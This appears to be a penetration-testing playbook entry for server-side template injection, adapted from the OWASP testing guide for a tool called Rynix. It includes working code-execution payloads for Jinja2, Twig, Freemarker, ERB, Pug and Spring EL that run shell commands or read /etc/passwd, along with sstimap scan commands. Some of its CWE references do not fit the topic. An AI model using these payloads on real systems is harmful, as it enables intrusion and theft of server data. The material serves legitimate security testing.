---
id: WSTG-INPV-18
title: Testing for Server-Side Template Injection
category: Input Validation
severity_range: High-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
---

# WSTG-INPV-18: Testing for Server-Side Template Injection (SSTI)

## Summary

Server-Side Template Injection occurs when user input is embedded into a server-side template engine in an unsafe manner. Template engines (Jinja2, Twig, Freemarker, Velocity, ERB, etc.) process template syntax, and injected template expressions can lead to remote code execution.

## Test Objectives

- Identify parameters whose values are processed by template engines
- Determine the template engine in use
- Test if arbitrary template expressions can be injected and executed

## Prerequisites

- Target application uses server-side templates for dynamic content
- Parameters that appear to be rendered in page content
- Docker pentest container capturing traffic

## Test Steps

### Step 1: Identify Template Injection Points

**CLI Actions:**
1. Use `curl` to find parameters whose values appear in rendered HTML
2. Look for features like: custom email templates, PDF generation, CMS page content, profile rendering, error messages with user input

### Step 2: Test for Template Engine Processing

**CLI Actions:**
Use `curl` to inject mathematical template expressions:

```
GET /page?name={{7*7}} HTTP/1.1
Host: target.com
```

If the response contains `49` instead of `{{7*7}}`, the input is being processed by a template engine.

**Universal Detection Payloads:**
```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
```

### Step 3: Identify the Template Engine

**CLI Actions:**
Use `curl` with engine-specific expressions:

**Test `{{7*'7'}}`:**
- Returns `7777777` → **Jinja2** (Python)
- Returns `49` → **Twig** (PHP)

**Test `${7*7}`:**
- Returns `49` → **Freemarker** (Java) or **Velocity** (Java) or **EL** (Java)

**Test `<%= 7*7 %>`:**
- Returns `49` → **ERB** (Ruby)

**Test `#{7*7}`:**
- Returns `49` → **Slim** (Ruby) or **Pug** (Node.js)

### Step 4: Attempt Code Execution

**CLI Actions:**
Based on the identified engine, use `curl` with RCE payloads:

**Jinja2 (Python):**
```
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

**Twig (PHP):**
```
{{_self.env.display("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**ERB (Ruby):**
```
<%= system("id") %>
<%= `id` %>
```

**Pug (Node.js):**
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('id').toString();return sh}()}
```

### Step 5: Verify Impact

**CLI Actions:**
If RCE is achieved, use `curl` to demonstrate impact:
- Read a known file (e.g., `/etc/hostname`)
- Execute `id` to show current user
- Do NOT perform destructive actions

## Payloads

### Universal Detection
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
${{7*7}}
{{7*'7'}}
{{dump(app)}}
${T(java.lang.Runtime).getRuntime()}
```

### Jinja2 (Python) - Detection to RCE
```
{{7*7}}
{{config}}
{{self.__init__.__globals__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{%endif%}{% endfor %}
```

### Twig (PHP) - Detection to RCE
```
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

### Freemarker (Java) - Detection to RCE
```
${7*7}
${7?upper_abc}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
```

### ERB (Ruby) - Detection to RCE
```
<%= 7*7 %>
<%= File.open('/etc/passwd').read %>
<%= system("id") %>
<%= `id` %>
```

### Spring EL (Java)
```
${T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Automated Testing with sstimap

**CLI Actions:**
Use `sstimap` for automated SSTI detection across multiple template engines:

```bash
# Test GET parameter
rynix_plugin_run('wstg') python3 /opt/sstimap/sstimap.py -u "https://target.com/page?name=test"

# Test POST data
rynix_plugin_run('wstg') python3 /opt/sstimap/sstimap.py -u "https://target.com/render" --data "template=test"
```

sstimap automatically identifies the template engine (Jinja2, Twig, Freemarker, ERB, Mako, etc.) and confirms if expressions are evaluated. Always verify sstimap's findings manually with curl before logging.

## Detection Criteria

A finding should be logged when:
- Mathematical expressions are evaluated (e.g., `{{7*7}}` returns `49`)
- Template engine objects or configuration are accessible
- Code execution is achieved through template expressions
- Error messages reveal template engine type and version

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Remote code execution achieved | Critical |
| Template engine objects accessible (potential RCE path) | High |
| Template expressions evaluated but sandboxed (no RCE) | Medium |
| Template errors disclosed but expressions not evaluated | Low |

## Remediation

- Never pass user input directly into template strings
- Use the template engine's built-in sandboxing features
- Treat templates as code, not data
- Use logic-less template engines where possible (Mustache, Handlebars)
- Apply strict input validation on values that will be rendered in templates
- Keep template engines updated to latest versions

## References

- [OWASP Testing Guide - Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [technique Research - Server-Side Template Injection](https://owasp.org/research/server-side-template-injection)
- [CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine](https://cwe.mitre.org/data/definitions/1336.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

